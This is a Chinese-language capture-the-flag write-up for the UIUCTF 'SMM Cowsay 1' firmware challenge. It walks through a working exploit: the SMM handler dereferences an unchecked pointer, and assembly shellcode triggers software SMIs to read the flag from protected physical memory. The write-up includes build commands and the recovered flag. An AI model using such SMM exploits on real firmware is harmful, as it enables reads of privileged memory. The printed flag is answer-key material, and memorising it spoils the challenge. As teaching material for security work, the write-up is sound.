# SMM Cowsay 1

## 题目简述

题目在 EDK2/OVMF 中加入了 `Binexec.efi` 和 `SmmCowsay.efi`。前者允许输入十六进制机器码并在普通 UEFI 环境中执行；后者注册一个 SMI handler，在 System Management Mode（SMM）中打印 cowsay。flag 位于物理地址 `0x44440000`，普通执行环境无法直接读取，但 SMM 可以访问。

SMM handler 接收 `EFI_SMM_COMMUNICATE_HEADER` 后只检查通信区至少能容纳一个指针，随即把通信数据解释为 `CHAR16 *` 并解引用：

```c
if (!CommBuffer || !CommBufferSize ||
    *CommBufferSize < sizeof(CHAR16 *))
  return EFI_SUCCESS;

Cowsay(*(CONST CHAR16 **)CommBuffer);
```

因此漏洞不是传统栈溢出，而是从普通世界向 SMM 传入任意指针，借 cowsay 的串读取逻辑构造 SMM 任意地址读。

## 解题过程

### 复原通信缓冲区

`Binexec` 执行输入代码前把 `gST` 放在 `RBX`，所以 shellcode 可通过 `RBX->BootServices->AllocatePool` 分配运行时内存。仓库的 `edk2debug.log` 与符号文件给出本次构建中的固定信息：

```text
PiSmmIpl base                         = 0x06ac7000
mSmmCorePrivateData offset            = 0x7140
CommunicationBuffer field offset      = 56
BufferSize field offset               = 64
EFI_SYSTEM_TABLE.BootServices offset  = 96
AllocatePool table offset             = 64
```

本题没有 ASLR，可以直接定位 `PiSmmIpl` 中的 `mSmmCorePrivateData`。分配缓冲区后，按下面格式填充：

```text
+0x00  16-byte gEfiSmmCowsayCommunicationGuid
+0x10  UINT64 MessageLength
+0x18  UINT64 pointer_to_read
```

对应 GUID 为：

```text
9a75cf12-2c83-4d10-b5a8-3575546592f7
```

把缓冲区地址及长度写入 `mSmmCorePrivateData`，再依次向端口 `0xB3`、`0xB2` 输出一个字节即可触发软件 SMI。官方解题代码的关键部分如下：

```asm
PiSmmIpl_base = 0x00006AC7000
mSmmCorePrivateData = 0x7140
CommunicationBuffer = 56
BufferSize = 64
BootServices = 96
AllocatePool = 64
EfiRuntimeServicesData = 6

_start:
  mov %rsp,%rbp
  and $-16,%rsp

  mov $(PiSmmIpl_base + mSmmCorePrivateData),%r13

  mov $EfiRuntimeServicesData,%rcx
  mov $(buffer_end - buffer),%rdx
  lea buffer_send(%rip),%r8
  mov BootServices(%rbx),%rax
  call *AllocatePool(%rax)
  test %rax,%rax
  jne bad

  lea buffer(%rip),%rsi
  mov buffer_send(%rip),%rdi
  mov $(buffer_end - buffer),%rcx
  rep movsb

  mov buffer_send(%rip),%rax
  movq %rax,CommunicationBuffer(%r13)
  movq $(buffer_end - buffer),BufferSize(%r13)

  xor %eax,%eax
  outb %al,$0xB3
  outb %al,$0xB2
  jmp smi1_done
smi1_done:
```

### 处理 CHAR16 与 ASCII 的错位

flag 在 `0x44440000` 处是 ASCII，而漏洞把它当成小端 `CHAR16` 数组。`SmmInternalPrint` 最终只把每个 `CHAR16` 的低 8 位写到串口，所以从偶地址开始只能得到偶数下标字节：

```text
uiuctf{...}
^ ^ ^ ^      -> uut{...
```

第一次 SMI 后把消息指针加一，再发起第二次 SMI，便能得到奇数下标字节 `icf...`：

```asm
  mov buffer_send(%rip),%rax
  add $(message - buffer),%rax
  incq (%rax)

  mov buffer_send(%rip),%rax
  movq %rax,CommunicationBuffer(%r13)
  movq $(buffer_end - buffer),BufferSize(%r13)
  xor %eax,%eax
  outb %al,$0xB3
  outb %al,$0xB2
  jmp smi2_done
smi2_done:
  ret

bad:
  hlt
  jmp bad

buffer_send:
  .quad 0

buffer:
  .long 0x9a75cf12
  .short 0x2c83
  .short 0x4d10
  .byte 0xb5,0xa8,0x35,0x75,0x54,0x65,0x92,0xf7
  .quad buffer_end - message
message:
  .quad 0x44440000
buffer_end:
```

把两次 cowsay 气泡中的有效字符交错合并即可还原完整 flag。

### 编译并提交

官方 healthcheck 将 `.text` 提取为纯机器码，再转为十六进制文本；远端接收 `done` 后执行：

```bash
gcc -static -nostartfiles solution.S -o solution.o
objcopy -j .text -O binary solution.o solution.bin
xxd -p solution.bin > solution.txt
```

发送 `solution.txt` 的内容并追加一行 `done`。仓库元数据记录的 flag 为：

```text
uiuctf{when_ring_zero_is_insufficient_35250e18}
```

## 方法总结

- 核心技巧：利用 SMM 通信 handler 对用户提供指针的直接解引用，把高权限 cowsay 变成任意地址读；再用相邻两个起始地址补齐 ASCII/UTF-16 错位造成的奇偶字节缺失。
- 识别信号：通信结构只验证长度、不验证指针是否位于合法通信区，而 SMM 代码能访问普通环境不可见的物理页。
- 复用要点：SMM 利用首先要分清普通世界、SMRAM 与通信区三者的信任边界；固定模块地址和结构偏移都与具体 OVMF 构建绑定，应从随题 `edk2debug.log` 和 `.debug` 符号重新提取，不能盲套到其他固件。
